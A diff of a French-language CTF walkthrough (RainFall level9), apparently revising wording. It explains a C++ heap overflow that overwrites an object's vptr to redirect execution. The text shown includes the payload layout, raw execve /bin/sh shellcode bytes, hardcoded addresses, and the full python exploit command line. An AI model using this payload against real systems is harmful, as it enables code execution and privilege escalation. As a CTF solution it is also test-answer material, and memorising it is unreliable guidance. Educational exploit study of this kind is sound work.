@@ -53,7 +53,7 @@ int main(int ac, char **av)
 }
 ```
 
-C'est un binaire ecrit en C++. Ici nous allons devoir ecraser le `vptr` de `inst2` pour appeler un shellcode. Le compilateur C ajoute en debut de classe un pointeur virtuel (`vptr`) qui pointe vers la `vtable`. Cette reference ensuite les definitions des fonctions virtuelles du code. Le `vptr` est en quelque sorte un pointeur sur pointeur `**vptr`. Dans le pseudo-code de Ghidra nous pouvons voir que chaque instance prend 108 octets d'espace sur la heap:
+C'est un binaire ecrit en C++. Ici nous allons devoir ecraser le `vptr` de `inst2` pour appeler un shellcode. Le compilateur C++ ajoute en debut de classe un pointeur virtuel (`vptr`) qui pointe vers la `vtable`. Cette table reference ensuite les definitions des fonctions virtuelles du code. Le `vptr` est en quelque sorte un pointeur sur pointeur `**vptr`. Dans le pseudo-code de Ghidra nous pouvons voir que chaque instance prend 108 octets d'espace sur la heap:
 
 ```C++
 this = operator.new(0x6c); //0x6c == 108
@@ -89,10 +89,10 @@ Donc voici les adresses dont nous allons avoir besoin:
  - `0x0804a010` -> Adresse du debut de notre shellcode. Presente au debut du buffer pour pouvoir deferencer deux fois
 
  A partir de ces informations nous pouvons construire notre payload comme ceci:
-  - `\x10\xa0\x04\x08` Adresse du debut de notre shellcode:
-  - `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80` Notre shellcode
-  - `A * 83` 108 - (Taille de notre adresse + shellcode) = 83
-  - `\x0c\xa0\x04\x08` adresse du debut du buffer
+  - `\x10\xa0\x04\x08`: Adresse du debut de notre shellcode:
+  - `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`: Notre shellcode
+  - `A * 83`: 108 - (Taille de notre adresse + shellcode) = 83
+  - `\x0c\xa0\x04\x08`: adresse du debut du buffer
 
 ```bash
 level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"')
